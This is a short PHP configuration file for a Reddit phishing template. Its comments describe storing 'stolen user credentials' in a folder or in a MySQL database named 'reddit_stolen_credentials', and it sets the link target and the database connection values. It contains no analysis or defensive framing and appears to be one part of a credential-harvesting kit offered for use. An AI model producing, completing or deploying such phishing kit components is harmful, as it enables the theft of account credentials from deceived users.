<?php
# Configuration file for phishing template
$reddit_link = "https://www.reddit.com"; // linking

// if you wanna use database instead of storing stolen user credentials
// in a folder, you need to set $use_db to true, (DEFAULT: false).
$use_db = false;

// mysql config properties
$db_host = "localhost"; // your host name
$db_user = "root"; // your mysql user
$db_pass = ""; // your mysql password (DEFAULT: empty).
$db_name = "reddit_stolen_credentials"; // your database name
?>
